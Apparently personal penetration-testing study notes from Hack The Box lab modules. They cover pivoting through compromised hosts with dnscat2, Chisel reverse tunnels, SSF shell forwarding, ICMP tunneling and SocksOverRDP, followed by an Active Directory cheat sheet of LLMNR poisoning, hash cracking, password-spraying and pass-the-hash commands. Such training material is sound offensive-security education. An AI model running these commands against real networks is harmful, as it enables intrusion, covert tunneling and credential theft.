    > We can use dnscat2 to interact with sessions and move further in a target environment on engagements. We will not cover all possibilities with dnscat2 in this module, but it is strongly encouraged to practice with it and maybe even find creative ways to use it on an engagement. Let's interact with our established session and drop into a shell.
    > Interacting with the Established Session
        dnscat2> window -i 1
        New window created: 1
        history_size (session) => 1000
        Session 1 Security: ENCRYPTED AND VERIFIED!
        (the security depends on the strength of your pre-shared secret!)
        This is a console session!
        
        That means that anything you type will be sent as-is to the
        client, and anything they type will be displayed as-is on the
        screen! If the client is executing a command and you don't
        see a prompt, try typing 'pwd' or something!
        
        To go back, type ctrl-z.
        
        Microsoft Windows [Version 10.0.18363.1801]
        (c) 2019 Microsoft Corporation. All rights reserved.
        
        C:\Windows\system32>
        exec (OFFICEMANAGER) 1>

[+] SOCKS5 Tunneling with Chisel
    > Chisel(https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in Go(https://go.dev/) that uses HTTP to transport data that is secured using SSH. Chisel can create a client-server tunnel connection in a firewall restricted environment. Let us consider a scenario where we have to tunnel our traffic to a webserver on the 172.16.5.0/23 network (internal network). We have the Domain Controller with the address 172.16.5.19. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.

* Setting Up & Using Chisel
    > Before we can use Chisel, we need to have it on our attack host. If we do not have Chisel on our attack host, we can clone the project repo using the command directly below:
    > Cloning Chisel
        m1l0js@htb[/htb]$ git clone https://github.com/jpillora/chisel.git

    > We will need the programming language Go installed on our system to build the Chisel binary. With Go installed on the system, we can move into that directory and use go build to build the Chisel binary.
    > Building the Chisel Binary
        m1l0js@htb[/htb]$ cd chisel
        go build -ldflags="-s -w"
            //where -s is “Omit all symbol information from the output file” or strip, and -w is “Omit the DWARF symbol table”
        upx brute chisel
        du -hs chisel
    > It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection. Two beneficial resources to complement this particular concept are Oxdf's blog post "Tunneling with Chisel and SSF(https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)" and IppSec's walkthrough of the box Reddish. IppSec starts his explanation of Chisel, building the binary and shrinking the size of the binary at the 24:29 mark of his video(https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s)
    > Once the binary is built, we can use SCP to transfer it to the target pivot host.
    > Transferring Chisel Binary to Pivot Host
        m1l0js@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
         
        ubuntu@10.129.202.64's password: 
        chisel                                        100%   11MB   1.2MB/s   00:09    

    > Then we can start the Chisel server/listener.
    > Running the Chisel Server on the Pivot Host
        ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

        2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
        2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234

    > The Chisel listener will listen for incoming connections on port 1234 using SOCKS5 (--socks5) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.

    > We can start a client on our attack host and connect to the Chisel server.
    > Connecting to the Chisel Server
        m1l0js@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks

        2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
        2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
        2022/05/05 14:21:18 client: tun: Bound proxies
        2022/05/05 14:21:19 client: Handshaking...
        2022/05/05 14:21:19 client: Sending config
        2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
        2022/05/05 14:21:19 client: tun: SSH connected

    > As you can see in the above output, the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080. Now we can modify our proxychains.conf file located at /etc/proxychains.conf and add 1080 port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.
    > Editing & Confirming proxychains.conf
    > We can use any text editor we would like to edit the proxychains.conf file, then confirm our configuration changes using tail.
    > Editing & Confirming proxychains.conf

        m1l0js@htb[/htb]$ tail -f /etc/proxychains.conf 
        
        #       proxy types: http, socks4, socks5
        #        ( auth types supported: "basic"-http  "user/pass"-socks )
        #
        [ProxyList]
        # add proxy here ...
        # meanwile
        # defaults set to "tor"
        # socks4 	127.0.0.1 9050
        socks5 127.0.0.1 1080

    > Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
    > Pivoting to the DC
        m1l0js@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

* Chisel Reverse Pivot

    > In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.
    > When the Chisel server has --reverse enabled, remotes can be prefixed with R to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying R:socks will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.
    > We'll start the server in our attack host with the option --reverse.
    > Starting the Chisel Server on our Attack Host
        m1l0js@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
        //Another way
            └─$ ./chisel server --host 10.10.16.13 --port 8000 --auth victim:victim --keepalive 1m --socks5 --reverse --pid -v 

        
        2022/05/30 10:19:16 server: Reverse tunnelling enabled
        2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
        2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234

    > There are other options I may want to add as well:

        --host allows me to define which interface to listen on, with all of them (0.0.0.0) being the default.
        --key allows me to generate a key pair used for the connection. This buys some security, but then again, the key will have to be sitting on the target box connecting back, so anyone who grabs it will be able to connect.
        --authfile and --auth allow me to specify user names and password necessary to connect.
        -v turns on verbose logging to the terminal.

    > Then we connect from the Ubuntu (pivot host) to our attack host, using the option R:socks
    > Starting the Chisel Server on our Attack Host

        ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
        
        2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
        2022/05/30 14:19:29 client: Handshaking...
        2022/05/30 14:19:30 client: Sending config
        2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
        2022/05/30 14:19:30 client: tun: SSH connected

    > Running this will connect to the server given, and create a tunnel for each give remote string. Remote strings take the format of <local-host>:<local-port>:<remote-host>:<remote-port> as defined by chisel.
    > Of the four items, only the remote port is required. If no local-host is given, it will assume 0.0.0.0 on the client. If no local-port is give, it will default to the same as the remote-port. If no remote-host is given, it will default to the server. You can give it R for local-host to indicate that you want to listen on the remote host (ie, open the listener on the server). In that case, the tunnel will go in the reverse direction.

    > We can use any editor we would like to edit the proxychains.conf file, then confirm our configuration changes using tail.
    > Editing & Confirming proxychains.conf
        m1l0js@htb[/htb]$ tail -f /etc/proxychains.conf 
        
        [ProxyList]
        # add proxy here ...
        # socks4    127.0.0.1 9050
        socks5 127.0.0.1 1080 

    > If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
    > Editing & Confirming proxychains.conf
        m1l0js@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

#Another examples of chisel 
1. Basic Client Listener

    > A silly example that illustrats listening on the client. I am on a target that can’t connect to the internet, but can route to my attacking machine. I’ll use chisel to create a tunnel to the site I want to download from as follows:

        ./chisel server -p 8000 on my attacker box.
        ./chisel client 1.1.1.1:8000 9001:www.exploit-db.com:443 wget https://localhost:9001/raw/44298   on the compromised box. This will connect back to my box, and start a listener on the target box. Any traffic sent to that listening port will be tunneled to my box, and then routed to www.exploit-db.com.
    > I can then use wget or curl to connect to 127.0.0.1:9001 and get things from the site. Depending on how the site is configured, I may have to turn off certificate checking, and/or modify the headers (such as Host) to get it to connect.

2. Basic Server Listener

    > A more interesting example is one like I faced in Reddish. I exploited a webapp, and needed to pivot into the network behind it. Since I was in a container, only the webapp port (in this case 1880) was forwarded through to the container, so I couldn’t just listen on another port.

    > In this case, I’ll use a reverse tunnel to open a listening port on my Kali host that can now talk to hosts behind my initial compromised host:

        ./chisel server -p 8000 --reverse curl http://localhost  on my local box.
        ./chisel client 1.1.1.1:8000 R:80:3.3.3.4:80 on the target. This will open a listener on port 80 on my Kali box, and any connections to that port will be forwarded to the target, which will pass them to port 80 on 3.3.3.4.

3. Socks proxy 
    > On Kali run ./chisel server -p 8000 --reverse.

    > On box you want to proxy through run ./chisel client 1.1.1.1:8000 R:socks.

    > This will start a listener on Kali on port 1080 which is a SOCKS5 proxy through the Chisel client.

    > Ippsec showed this at the end of his video, and it’s worth seeing. chisel only let’s the server act as a socks proxy. But, in the case of Reddish, I don’t have a way to connect directly to that server. I’ll use chisel to set up a tunnel so I can connect to another chisel in the opposite direction:

        ./chisel server -p 8000 --reverse on local box, as usual.
        ./chisel client 1.1.1.1:8000 R:8001:127.0.0.1:9001 on target box. Now anything I send to localhost:8001 on kali will forward to localhost:9001 on target.
        ./chisel server -p 9001 --socks5 on target. Now I have a chisel server listening on 9001, in socks mode, and a way to get traffic to that port.
        ./chisel client localhost:8001 socks on Kali box. This connection is forwarded through the first tunnel and connects to the chisel server running on the box. Now my local host is listening on port 1080 (default, can change that with arguments) and will send traffic to target, and then proxy it outbound.

    > Now I can use proxychains or FoxyProxy to interact with the network behind the target natually.

* More Complex Examples

    > At this point, these tunnels can be used to create more complex setups. For example, to go even more layers deep into a network, I can set up listeners on the first hop that forward back to the chisel server on kali, and then create new chisel reverse tunnels from there.

! SSF
    > SSF is using an SSL encrypted communication channel and therefore I will need certificates and keys. The easy way is to checkout the GitHub repository(https://github.com/securesocketfunneling/ssf) and use the included certs subdirectory. Also I will use the pre-compiled binaries provided and downloadable under Releases in GitHub.

    + Server 
        On my Kali machine I’ll start the SSF daemon:
        Now the server is running on port 8011, which is the default port. I can change the port with the -p [port] option.
    + Client

        On target host I will start the client, telling it to connect back to my box. I’ll use the following options:
        
            -g - allow gateway ports. This allows client to bind local sockets to address besides localhost.
            -F 1080 - This runs a socks proxy on the server on port 1080.
            -Y 1111 - This opens local port 1111 as a shell on the client.
            -L 172.19.0.4:2222:10.10.14.3:2222 and -L 172.19.0.4:3333:10.10.14.3:3333 - These will open listeners on the target machine that will forwards back to my attacker box. This will come in handy when I want to exploit further machines that can’t talk to my attacker box directly.

            ./ssf -g -F 1080 -Y 1111 -L 172.19.0.4:2222:10.10.14.3:2222 -L 172.19.0.4:3333:10.10.14.3:3333 10.10.14.3

    > I now have following setup:

        + Listening socket on kali:1080 that is providing a SOCKS proxy to the network behind the target.
        + Listening socket on kali:1111 that is providing a shell to the target.
        + Tunnels from target box back to local sockets for future shells or file uploads.


[+] ICMP tunneling with SOCKS

    > ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses. ICMP tunneling would only work when ping responses are permitted within a firewalled network. When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server.

    > We will use the ptunnel-ng(https://github.com/utoni/ptunnel-ng) tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the ptunnel-ng client. We can start the ptunnel-ng server on the target pivot host. Let's start by setting up ptunnel-ng.
    
    > Setting Up & Using ptunnel-ng
    > If ptunnel-ng is not on our attack host, we can clone the project using git.
    > Cloning Ptunnel-ng
        m1l0js@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git

    > Once the ptunnel-ng repo is cloned to our attack host, we can run the autogen.sh script located at the root of the ptunnel-ng directory.
    > Building Ptunnel-ng with Autogen.sh
        m1l0js@htb[/htb]$ sudo ./autogen.sh 

    > After running authgen.sh, ptunnel-ng can be used from the client and server-side. We will now need to transfer the repo from our attack host to the target host. As in previous sections, we can use SCP to transfer the files. If we want to transfer the entire repo and the files contained inside, we will need to use the -r option with SCP.
    > Transferring Ptunnel-ng to the Pivot Host
        m1l0js@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/

    > With ptunnel-ng on the target host, we can start the server-side of the ICMP tunnel using the command directly below.
    > Starting the ptunnel-ng Server on the Target Host
        ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
        //Another way
        root@WEB01:/home/ubuntu# ./ptunnel 


        [sudo] password for ubuntu: 
        ./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
        [inf]: Starting ptunnel-ng 1.42.
        [inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
        [inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
        [inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
        [inf]: Forwarding incoming ping packets over TCP.
        [inf]: Ping proxy is listening in privileged mode.
        [inf]: Dropping privileges now.

    > The IP address following -r should be the IP we want ptunnel-ng to accept connections on. In this case, whatever IP is reachable from our attack host would be what we would use. We would benefit from using this same thinking & consideration during an actual engagement.
    > Back on the attack host, we can attempt to connect to the ptunnel-ng server (-p <ipAddressofTarget>) but ensure this happens through local port 2222 (-l2222). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.

    > Connecting to ptunnel-ng Server from Attack Host
        m1l0js@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
        //Another way
        └─# ./ptunnel -p 10.129.72.55  -lp 8000 -da 172.16.5.19 -dp 3389

        
        [inf]: Starting ptunnel-ng 1.42.
        [inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
        [inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
        [inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
        [inf]: Relaying packets from incoming TCP streams.

    > With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (-p2222).
    > Tunneling an SSH connection through an ICMP Tunnel
        m1l0js@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1
        
        ubuntu@127.0.0.1's password: 
        Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
        ubuntu@WEB01:~$ 

    > If configured correctly, we will be able to enter credentials and have an SSH session all through the ICMP tunnel.
    > On the client & server side of the connection, we will notice ptunnel-ng gives us session logs and traffic statistics associated with the traffic that passes through the ICMP tunnel. This is one way we can confirm that our traffic is passing from client to server utilizing ICMP.

    > We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.
    > Enabling Dynamic Port Forwarding over SSH
        m1l0js@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
        
        ubuntu@127.0.0.1's password: 
        Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
        <snip>

    > We could use proxychains with Nmap to scan targets on the internal network (172.16.5.x). Based on our discoveries, we can attempt to connect to the target.
    > Proxychaining through the ICMP Tunnel

        m1l0js@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389
        
        ProxyChains-3.1 (http://proxychains.sf.net)
        Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 11:10 EDT
        |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<><>-OK
        |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
        |S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
        Nmap scan report for 172.16.5.19
        Host is up (0.12s latency).
        
        PORT     STATE SERVICE       VERSION
        3389/tcp open  ms-wbt-server Microsoft Terminal Services
        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
        
        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds

Network Traffic Analysis Considerations

    > It is important that we confirm the tools we are using are performing as advertised and that we have set up & are operating them properly. In the case of tunneling traffic through different protocols taught in this section with ICMP tunneling, we can benefit from analyzing the traffic we generate with a packet analyzer like Wireshark. Take a close look at the short clip below.
    > In the first part of this clip, a connection is established over SSH without using ICMP tunneling. We may notice that TCP & SSHv2 traffic is captured.
    > The command used in the clip: ssh ubuntu@10.129.202.64
    
    > In the second part of this clip, a connection is established over SSH using ICMP tunneling. Notice the type of traffic that is captured when this is performed.
    > Command used in clip: ssh -p2222 -lubuntu 127.0.0.1



[+] RDP and SOCKS Tunneling with SocksOverRDP

    > There are often times during an assessment when we may be limited to a Windows network and may not be able to use SSH for pivoting. We would have to use tools available for Windows operating systems in these cases. SocksOverRDP(https://github.com/nccgroup/SocksOverRDP) is an example of a tool that uses Dynamic Virtual Channels (DVC) from the Remote Desktop Service feature of Windows. DVC is responsible for tunneling packets over the RDP connection. Some examples of usage of this feature would be clipboard data transfer and audio sharing. However, this feature can also be used to tunnel arbitrary packets over the network. We can use SocksOverRDP to tunnel our custom packets and then proxy through it. We will use the tool Proxifier(https://www.proxifier.com/) as our proxy server.

    > We can start by downloading the appropriate binaries to our attack host to perform this attack. Having the binaries on our attack host will allow us to transfer them to each target where needed. We will need:

        + SocksOverRDP x64 Binaries(https://github.com/nccgroup/SocksOverRDP/releases)
        + Proxifier Portable Binary(https://www.proxifier.com/download/#win-tab)
        + We can look for ProxifierPE.zip

    > We can then connect to the target using xfreerdp and copy the SocksOverRDPx64.zip file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using regsvr32.exe.
    > Loading SocksOverRDP.dll using regsvr32.exe
        C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll

    > Now we can connect to 172.16.5.19 over RDP using mstsc.exe, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080. We can use the credentials victor:pass@123 to connect to 172.16.5.19.

    > We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.

    > When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.
    > Confirming the SOCKS Listener is Started

        C:\Users\htb-student\Desktop\SocksOverRDP-x64> netstat -antb | findstr 1080
          TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING

    > After starting our listener, we can transfer Proxifier portable to the Windows 10 target (on the 10.129.x.x network), and configure it to forward all our packets to 127.0.0.1:1080. Proxifier will route traffic through the given host and port. See the clip below for a quick walkthrough of configuring Proxifier.
    > Configuring Proxifier
        (https://academy.hackthebox.com/storage/modules/158/configuringproxifier.gif)

    > With Proxifier configured and running, we can start mstsc.exe, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.

    > RDP Performance Considerations
    > When interacting with our RDP sessions on an engagement, we may find ourselves contending with slow performance in a given session, especially if we are managing multiple RDP sessions simultaneously. If this is the case, we can access the Experience tab in mstsc.exe and set Performance to Modem.


[+] Detection and prevention
    > Setting a Baseline

    > Understanding everything present and happening in a network environment is vital. As defenders, we should be able to quickly identify and investigate any new hosts that appear in our network, any new tools or applications that get installed on hosts outside of our application catalog, and any new or unique network traffic generated. An audit of everything listed below should be done annually, if not every few months, to ensure your records are up to date. Among some of the considerations we can start with are:
    > Things to Document and Track

        + DNS records, network device backups, and DHCP configurations
        + Full and current application inventory
        + A list of all enterprise hosts and their location
        + Users who have elevated permissions
        + A list of any dual-homed hosts (More than one network interface)
        + Keeping a visual network diagram of your environment

    > Along with tracking the items above, keeping a visual network diagram of your environment up-to-date can be highly effective when troubleshooting issues or responding to an incident. Netbrain(https://www.netbraintech.com/) is an excellent example of one tool that can provide this functionality and interactive access to all appliances in the diagram. If we want a way to document our network environment visually, we can use a free tool like diagrams.net(https://app.diagrams.net/). Lastly, for our baseline, understanding what assets are critical to the operation of your organization and monitoring those assets is a must.

Boxes To Pwn

    Enterprise IPPSec Walkthrough
    Inception IPPSec Walkthrough
    Reddish IPPSec Walkthroguh This host is quite a challenge.

Writers/Educational Creators and Blogs To Follow

    > Between the HTB Discord, Forums, and blogs, there are plenty of outstanding write-ups to help advance your skills along the way. One to pay attention to would be 0xdf's walkthroughs)https://0xdf.gitlab.io/). His blog is a great resource to help us understand how the tools, tactics, and concepts we are learning tie together into a holistic attack path. The list below contains links to other authors and blogs we feel do a great job discussing Information Security topics.
    > RastaMouse(https://rastamouse.me/) writes excellent content on Red-Teaming, C2 infrastructure, pivoting, payloads, etc. (He even made a Pro Lab to showcase those things!)
    > SpecterOps(https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6) has written a great post covering SSH Tunneling and the use of proxies over a multitude of protocols. It's a must-read for anyone looking to know more about the subject and would make a handy resource to have during an engagement.
    > The HTB Blog(https://www.hackthebox.com/blog) is, of course, a great place to read up on current threats, how-to's for popular TTPs, and more.
    > SANS(https://www.sans.org/webcasts/dodge-duck-dip-dive-dodge-making-the-pivot-cheat-sheet-119115/) puts out plenty of great infosec related information and webcasts like the one linked here are a great example of that. This will cover many different Pivoting tools and avenues of use.
    > Plaintext's Pivoting Workshop(https://youtu.be/B3GxYyGFYmQ) is an incredible workshop that our very own Academy Training Developer, Plaintext, put together to help prepare players for Cyber Apocalypse CTF 2022. The workshop is delivered in an engaging & entertaining manner, and viewers will benefit from it for years to come. Check it out if you get the chance.

----------------======================-----------------
ACTIVE DIRECTORY 

# Initial Enumeration 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `nslookup ns1.inlanefreight.com`                             | Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host. |
| `sudo tcpdump -i ens224`                                     | Used to start capturing network packets on the network interface proceeding the `-i` option a Linux-based host. |
| `sudo responder -I ens224 -A`                                | Used to start responding to & analyzing `LLMNR`, `NBT-NS` and `MDNS` queries on the interface specified proceeding the` -I` option and operating in `Passive Analysis` mode which is activated using `-A`. Performed from a Linux-based host |
| `fping -asgq 172.16.5.0/23`                                  | Performs a ping sweep on the specified network segment from a Linux-based host. |
| `sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum` | Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (`-A`) based on a list of hosts (`hosts.txt`) specified in the file proceeding `-iL`. Then outputs the scan results to the file specified after the `-oN`option. Performed from a Linux-based host |
| `sudo git clone https://github.com/ropnop/kerbrute.git`      | Uses `git` to clone the kerbrute tool from a Linux-based host. |
| `make help`                                                  | Used to list compiling options that are possible with `make` from a Linux-based host. |
| `sudo make all`                                              | Used to compile a `Kerbrute` binary for multiple OS platforms and CPU architectures. |
| `./kerbrute_linux_amd64`                                     | Used to test the chosen complied `Kebrute` binary from a Linux-based host. |
| `sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute`       | Used to move the `Kerbrute` binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool. |
| `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` | Runs the Kerbrute tool to discover usernames in the domain (`INLANEFREIGHT.LOCAL`) specified proceeding the `-d` option and the associated domain controller specified proceeding `--dc`using a wordlist and outputs (`-o`) the results to a specified file. Performed from a Linux-based host. |



# LLMNR/NTB-NS Poisoning 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `responder -h`                                               | Used to display the usage instructions and various options available in `Responder` from a Linux-based host. |
| `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt` | Uses `hashcat` to crack `NTLMv2` (`-m`) hashes that were captured by responder and saved in a file (`frond_ntlmv2`). The cracking is done based on a specified wordlist. |
| `Import-Module .\Inveigh.ps1`                                | Using the `Import-Module` PowerShell cmd-let to import the Windows-based tool `Inveigh.ps1`. |
| `(Get-Command Invoke-Inveigh).Parameters`                    | Used to output many of the options & functionality available with `Invoke-Inveigh`. Peformed from a Windows-based host. |
| `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`    | Starts `Inveigh` on a Windows-based host with LLMNR & NBNS spoofing enabled and outputs the results to a file. |
| `.\Inveigh.exe`                                              | Starts the `C#` implementation of `Inveigh` from a Windows-based host. |
| `$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \|foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}` | PowerShell script used to disable NBT-NS on a Windows host.  |



# Password Spraying & Password Policies

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `#!/bin/bash  for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}     do echo $x; done` | Bash script used to generate `16,079,616` possible username combinations from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol` | Uses `CrackMapExec`and valid credentials (`avazquez:Password123`) to enumerate the password policy (`--pass-pol`) from a Linux-based host. |
| `rpcclient -U "" -N 172.16.5.5`                              | Uses `rpcclient` to discover information about the domain through `SMB NULL` sessions. Performed from a Linux-based host. |
| `rpcclient $> querydominfo`                                  | Uses `rpcclient` to enumerate the password policy in a target Windows domain from a Linux-based host. |
| `enum4linux  -P 172.16.5.5`                                  | Uses `enum4linux` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host. |
| `enum4linux-ng -P 172.16.5.5 -oA ilfreight`                  | Uses `enum4linux-ng` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host, then presents the output in YAML & JSON saved in a file proceeding the `-oA` option. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength` | Uses `ldapsearch` to enumerate the password policy in a  target Windows domain from a Linux-based host. |
| `net accounts`                                               | Used to enumerate the password policy in a Windows domain from a Windows-based host. |
| `Import-Module .\PowerView.ps1`                              | Uses the Import-Module cmd-let to import the `PowerView.ps1` tool from a Windows-based host. |
| `Get-DomainPolicy`                                           | Used to enumerate the password policy in a target Windows domain from a Windows-based host. |
| `enum4linux -U 172.16.5.5  \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"` | Uses `enum4linux` to discover user accounts in a target Windows domain, then leverages `grep` to filter the output to just display the user from a Linux-based host. |
| `rpcclient -U "" -N 172.16.5.5  rpcclient $> enumdomuser`    | Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 --users`                        | Uses `CrackMapExec` to discover users (`--users`) in a target Windows domain from a Linux-based host. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  \| grep sAMAccountName: \| cut -f2 -d" "` | Uses `ldapsearch` to discover users in a target Windows doman, then filters the output using `grep` to show only the `sAMAccountName` from a Linux-based host. |
| `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`              | Uses the python tool `windapsearch.py` to discover users in a target Windows domain from a Linux-based host. |
| `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done` | Bash one-liner used to perform a password spraying attack using `rpcclient` and a list of users (`valid_users.txt`) from a Linux-based host. It also filters out failed attempts to make the output cleaner. |
| `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1` | Uses `kerbrute` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +` | Uses `CrackMapExec` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using `grep`. |
| ` sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123` | Uses `CrackMapExec` to validate a set of credentials from a Linux-based host. |
| `sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +` | Uses `CrackMapExec` and the -`-local-auth` flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using `grep`. |
| `Import-Module .\DomainPasswordSpray.ps1`                    | Used to import the PowerShell-based tool `DomainPasswordSpray.ps1` from a Windows-based host. |
| `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue` | Performs a password spraying attack and outputs (-OutFile) the results to a specified file (`spray_success`) from a Windows-based host. |

# Enumerating Security Controls

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-MpComputerStatus`                                       | PowerShell cmd-let used to check the status of `Windows Defender Anti-Virus` from a Windows-based host. |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections` | PowerShell cmd-let used to view `AppLocker` policies from a Windows-based host. |
| `$ExecutionContext.SessionState.LanguageMode`                | PowerShell script used to discover the `PowerShell Language Mode` being used on a Windows-based host. Performed from a Windows-based host. |
| `Find-LAPSDelegatedGroups`                                   | A `LAPSToolkit` function that discovers `LAPS Delegated Groups` from a Windows-based host. |
| `Find-AdmPwdExtendedRights`                                  | A `LAPSTookit` function that checks the rights on each computer with LAPS enabled for any groups with read access and users with `All Extended Rights`. Performed from a Windows-based host. |
| `Get-LAPSComputers`                                          | A `LAPSToolkit` function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host. |



